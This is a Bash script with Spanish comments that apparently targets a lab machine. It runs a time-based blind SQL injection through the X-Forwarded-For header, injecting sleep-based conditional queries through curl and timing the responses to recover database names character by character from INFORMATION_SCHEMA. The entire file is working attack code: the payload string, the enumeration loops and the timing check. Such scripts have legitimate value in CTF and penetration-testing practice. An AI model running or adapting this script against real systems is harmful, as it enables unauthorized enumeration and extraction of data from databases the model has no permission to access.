#!/bin/bash
#Idea: hacer que el servidor SQL duerma 1 seg. que en el caso de la inyección, equivale a sleep(0.043), sólo si el nombre de la base de datos contiene la letra en la posición indicada
#Payload: Para estta máquina se utiliza X-Forwarded-For para enviar la inyección y verificar si hay un retraso en la respuesta
# Procedimiento: 
#	Para cada base de datos encontrada, el script intenta descubrir su nombre carácter por carácter.
#	Iteramos por posición y caracter con substring
#		Para cada posición en el nombre, intenta cada carácter del conjunto
#		Usa SUBSTRING(SCHEMA_NAME, position, 1) para verificar si el carácter coincide en la posición especificada.
#		Si encuentra el carácter correcto (basado en el retraso de respuesta), lo agrega al nombre parcial de la base de datos

url="http://192.168.44.134"  
expected_delay=1.0           
max_databases=2              
max_length=20                # Valor aproximado
characters='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_' # Caracteres a probar

echo -e "\nDescubriendo nombres de bases de datos...\n"

# Iteramos por las 2 bases de datos
for ((db_index=1; db_index<=max_databases; db_index++)); do
    db_name=""
    echo -e "\n[*] Descubriendo el nombre de la base de datos #$db_index"

    # Iteramos la cadena (letras)
    for ((position=1; position<=max_length; position++)); do
        found_char=0  # Bandera para saber si se encontró un carácter en la posición actual

        # Testeamos cada caracter
        for character in $(echo -n "$characters" | fold -w1); do
            # Construcción de Payload
            payload="1' or if((SELECT SUBSTRING(SCHEMA_NAME,$position,1) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT $((db_index-1)),1) = '$character', sleep(0.043), 0) #"

            # Envía la solicitud con el encabezado X-Forwarded-For para inyectar el payload
            start=$(date +%s.%N)
            response=$(curl -s -w "%{time_total}" -o /dev/null -H "X-Forwarded-For: $payload" "$url")
            end=$(date +%s.%N)

            # Calcula el tiempo de respuesta
            duration=$(echo "$end - $start" | bc)

            # Verifica si el retraso es cercano al tiempo esperado
            if (( $(echo "$duration > $expected_delay" | bc -l) )); then
                db_name+=$character
                echo -ne "\r[+] Nombre parcial: $db_name"
                found_char=1
                break
            fi
        done

        # Si no se encontró ningún carácter, significa que hemos terminado el nombre
        if [ $found_char -eq 0 ]; then
            break
        fi
    done

    echo -e "\n[+] Nombre de la base de datos #$db_index: $db_name"
done
